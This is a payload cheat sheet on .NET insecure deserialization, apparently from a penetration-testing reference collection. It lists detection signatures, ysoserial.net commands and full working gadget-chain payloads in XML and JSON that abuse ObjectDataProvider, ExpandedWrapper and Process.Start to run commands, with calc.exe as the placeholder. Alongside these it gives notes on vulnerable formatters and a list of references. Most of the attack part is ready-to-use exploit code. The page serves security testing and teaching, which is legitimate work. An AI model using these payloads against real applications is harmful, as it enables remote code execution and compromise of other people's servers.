# .NET Deserialization

> .NET serialization is the process of converting an object’s state into a format that can be easily stored or transmitted, such as XML, JSON, or binary. This serialized data can then be saved to a file, sent over a network, or stored in a database. Later, it can be deserialized to reconstruct the original object with its data intact. Serialization is widely used in .NET for tasks like caching, data transfer between applications, and session state management.


## Summary

* [Detection](#detection)
* [Tools](#tools)
* [Formatters](#formatters)
    * [XmlSerializer](#xmlserializer)
    * [DataContractSerializer](#datacontractserializer)
    * [NetDataContractSerializer](#netdatacontractserializer)
    * [LosFormatter](#losformatter)
    * [JSON.NET](#jsonnet)
    * [BinaryFormatter](#binaryformatter)
* [POP Gadgets](#pop-gadgets)
* [References](#references)


## Detection

| Data           | Description         |
| -------------- | ------------------- |
| `AAEAAD` (Hex) | .NET BinaryFormatter |
| `FF01` (Hex)   | .NET ViewState |
| `/w` (Base64)   | .NET ViewState |

Example: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`


## Tools

* [pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters](https://github.com/pwntester/ysoserial.net)
```ps1
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## Formatters

![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)    
.NET Native Formatters from [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)


### XmlSerializer

* In C# source code, look for `XmlSerializer(typeof(<TYPE>));`.
* The attacker must control the **type** of the XmlSerializer.
* Payload output: **XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```


### DataContractSerializer

> The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.

* In C# source code, look for `DataContractSerializer(typeof(<TYPE>))`.
* Payload output: **XML**
* Data **Type** must be user-controlled to be exploitable


### NetDataContractSerializer 

> It extends the `System.Runtime.Serialization.XmlObjectSerializer` class and is capable of serializing any type annotated with serializable attribute as `BinaryFormatter`.

* In C# source code, look for `NetDataContractSerializer().ReadObject()`.
* Payload output: **XML**

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```


### LosFormatter

* Use `BinaryFormatter` internally.

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```


### JSON.NET

* In C# source code, look for `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`.
* Payload output: **JSON**

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```


### BinaryFormatter

> The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.

* In C# source code, look for `System.Runtime.Serialization.Binary.BinaryFormatter`.
* Exploitation requires `[Serializable]` or `ISerializable` interface.
* Payload output: **Binary**


```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```


## POP Gadgets

These gadgets must have the following properties:

* Serializable
* Public/settable variables
* Magic "functions": Get/Set, OnSerialisation, Constructors/Destructors

You must carefully select your **gadgets** for a targeted **formatter**.


List of popular gadgets used in common payloads.
* **ObjectDataProvider** from `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`
    * Use `MethodParameters` to set arbitrary parameters
    * Use `MethodName` to call an arbitrary function 
* **ExpandedWrapper**
    * Specify the `object types` of the objects that are encapsulated
    ```cs
    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
    ```
* **System.Configuration.Install.AssemblyInstaller**
    * Execute payload with Assembly.Load   
    ```cs
    // System.Configuration.Install.AssemblyInstaller
    public void set_Path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = Assembly.LoadFrom(value);
    }
    ```


## References

- [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - Slides - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - White Paper - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [Attacking .NET Deserialization - Alvaro Muñoz - April 28, 2018](https://youtu.be/eDfGpu3iE4Q)
- [Attacking .NET Serialization - Alvaro - October 20, 2017](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
- [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - HackTricks - July 18, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
- [Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
- [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - April 23, 2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Finding a New DataContractSerializer RCE Gadget Chain - dugisec - November 7, 2019](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
- [Friday the 13th: JSON Attacks - DEF CON 25 Conference - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- [Friday the 13th: JSON Attacks - Slides - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [Friday the 13th: JSON Attacks - White Paper - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - Alyssa Rahman - December 13, 2021](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
- [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Shubham Shah - November 2, 2021](https://blog.assetnote.io/2021/11/02/sitecore-rce/)